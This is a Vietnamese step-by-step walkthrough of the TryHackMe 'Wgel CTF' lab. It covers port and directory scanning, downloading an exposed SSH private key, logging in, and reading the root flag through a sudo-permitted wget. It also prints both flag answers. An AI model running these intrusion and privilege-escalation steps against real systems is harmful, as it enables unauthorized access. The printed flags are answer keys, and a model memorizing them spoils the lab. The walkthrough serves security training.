# Wgel CTF

### 1. Giới thiệu

Đây là bài hướng dẫn chi tiết từng bước (step-by-step) cho phòng "Wgel CTF" trên TryHackMe. Mục tiêu của chúng ta là khai thác lỗ hổng hệ thống để tìm được hai lá cờ (flag): user flag và root flag.

**IP Mục tiêu**: 10.48.170.13

***

### 2. Thu thập thông tin (Reconnaissance)

Bước đầu tiên trong mọi cuộc tấn công là thu thập thông tin về mục tiêu. Chúng ta cần biết mục tiêu đang mở những cổng nào và chạy dịch vụ gì.

#### Bước 2.1: Quét cổng (Port Scanning)

Sử dụng công cụ `nmap` để quét các cổng mở trên máy chủ mục tiêu.

* `-sC`: Sử dụng các script mặc định để phát hiện lỗi phổ biến.
* `-sV`: Xác định phiên bản của dịch vụ đang chạy.
* `-oN nmap_scan.txt`: Lưu kết quả vào file để xem lại sau.

```bash
nmap -sC -sV -oN nmap_scan.txt 10.48.170.13
```

**Kết quả phân tích:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Chúng ta thấy có 2 cổng quan trọng:

* **Cổng 22 (SSH)**: Dùng để đăng nhập từ xa. Nếu có tài khoản, ta có thể truy cập server.
* **Cổng 80 (HTTP)**: Đang chạy một trang web Apache. Đây là nơi chúng ta sẽ tập trung khai thác đầu tiên.

#### Bước 2.2: Liệt kê Web (Web Enumeration)

Truy cập `http://10.48.170.13`, ta chỉ thấy trang mặc định của Apache ("It works!"). Điều này thường có nghĩa là nội dung thực sự đang bị ẩn ở các thư mục khác.

Sử dụng công cụ `gobuster` để dò tìm các thư mục ẩn (fuzzing directories). Chúng ta dùng wordlist phổ biến là `common.txt`.

```bash
gobuster dir -u http://10.48.170.13 -w /usr/share/wordlists/dirb/common.txt
```

**Kết quả:**

```
/sitemap (Status: 301)
```

Gobuster tìm thấy thư mục `/sitemap`. Truy cập vào đó, ta thấy giao diện của một trang web hoàn chỉnh. Tuy nhiên, chúng ta cần tìm sâu hơn nữa.

#### Bước 2.3: Fuzzing sâu hơn

Tiếp tục sử dụng `gobuster` để quét bên trong thư mục `/sitemap` vừa tìm được.

```bash
gobuster dir -u http://10.48.170.13/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

**Kết quả quan trọng:**

```
/.ssh (Status: 301)
```

Chúng ta phát hiện thư mục `/.ssh`. Đây là một lỗi cấu hình nghiêm trọng, vì thư mục `.ssh` thường chứa các khóa bảo mật (SSH keys) để đăng nhập server.

Truy cập `http://10.48.170.13/sitemap/.ssh/`, ta thấy file `id_rsa`. Đây chính là khóa riêng tư (private key) mà chúng ta cần!

***

### 3. Giành quyền truy cập (Gaining Access)

#### Bước 3.1: Tải và chuẩn bị SSH Key

Tải file `id_rsa` về máy của bạn:

```bash
wget http://10.48.170.13/sitemap/.ssh/id_rsa
```

**Quan trọng:** SSH yêu cầu file khóa riêng tư phải có quyền hạn chế (chỉ chủ sở hữu mới được đọc), nếu không nó sẽ từ chối sử dụng. Ta cần cấp quyền `600` cho file này:

```bash
chmod 600 id_rsa
```

#### Bước 3.2: Tìm tên người dùng (Username)

Có khóa rồi, nhưng ta cần biết tên người dùng (username) để đăng nhập. Để tìm tên người dùng (username), tôi kiểm tra mã nguồn trang web. Tại trang chủ (`http://10.48.170.13/index.html`), khi xem mã nguồn (View Source), tôi tìm thấy một bình luận của lập trình viên:

```html
<!-- Jessie don't forget to udate the webiste -->
```

Điều này tiết lộ tên người dùng là **jessie**.

#### Bước 3.3: Đăng nhập SSH

Sử dụng khóa `id_rsa` và username `jessie` để kết nối:

```bash
ssh -i id_rsa jessie@10.48.170.13
```

Nếu thành công, bạn sẽ thấy dấu nhắc lệnh của user `jessie`.

#### Bước 3.4: Lấy User Flag

Liệt kê file trong thư mục của jessie để tìm cờ:

```bash
ls -R /home/jessie
```

hoac su dung lenh :

```
find / -type f -name "*.txt" 2>/dev/null
```

Ta thấy file `user_flag.txt` nằm trong thư mục `Documents`. Đọc nó:

```bash
cat /home/jessie/Documents/user_flag.txt
```

**User Flag**: `057c67131c3d5e42dd5cd3075b198ff6`

<figure><img src="../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

***

### 4. Leo thang đặc quyền (Privilege Escalation)

Bây giờ ta đã là user thường (`jessie`), mục tiêu tiếp theo là trở thành `root` (quản trị viên cao nhất).

#### Bước 4.1: Kiểm tra quyền Sudo

Lệnh đầu tiên nên chạy khi muốn leo quyền là kiểm tra xem user hiện tại được phép chạy lệnh gì với quyền root (sudo) mà không cần mật khẩu.

```bash
sudo -l
```

**Kết quả:**

<figure><img src="../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

```
User jessie may run the following commands on CorpOne:
    (root) NOPASSWD: /usr/bin/wget
```

Kết quả cho thấy `jessie` có thể chạy `/usr/bin/wget` với quyền root mà **không cần mật khẩu** (`NOPASSWD`).

#### Bước 4.2: Khai thác Wget để đọc file Root

`wget` là công cụ tải file, nhưng nó có các tính năng có thể bị lạm dụng để đọc hoặc ghi file hệ thống.

Chúng ta muốn đọc file `/root/root_flag.txt` (chỉ root mới đọc được). Vì ta chạy `wget` với `sudo`, ta có quyền đọc file này.

**Phương pháp: Sử dụng tùy chọn `-i`** Tùy chọn `-i` (input file) bảo `wget` đọc danh sách URL từ một file. Nếu ta đưa cho nó file `/root/root_flag.txt`, `wget` sẽ đọc nội dung file đó và cố gắng kết nối đến "URL" đó. Vì nội dung flag không phải là URL hợp lệ, `wget` sẽ báo lỗi DNS, và trong thông báo lỗi đó sẽ **hiện ra nội dung của flag**!

<figure><img src="../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

Lệnh khai thác:

<figure><img src="../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

```bash
sudo /usr/bin/wget -i /root/root_flag.txt
```

**Kết quả đầu ra:**

```
Resolving b1b968b37519ad1daa6408188649263d... failed: Name or service not known.
wget: unable to resolve host address ‘b1b968b37519ad1daa6408188649263d’
```

Chuỗi ký tự `b1b968b37519ad1daa6408188649263d` chính là nội dung bên trong file `root_flag.txt` mà `wget` đã đọc được và cố gắng phân giải tên miền.

**Root Flag**: `b1b968b37519ad1daa6408188649263d`

***

### 5. Tổng kết

Chúc mừng! Bạn đã hoàn thành phòng Wgel CTF. Các bước chính đã thực hiện:

1. **Recon**: Tìm ra thư mục ẩn `.ssh` trên web server.
2. **Access**: Sử dụng SSH key bị lộ để đăng nhập.
3. **PrivEsc**: Lợi dụng cấu hình `sudo` không an toàn của lệnh `wget` để đọc file flag của root.
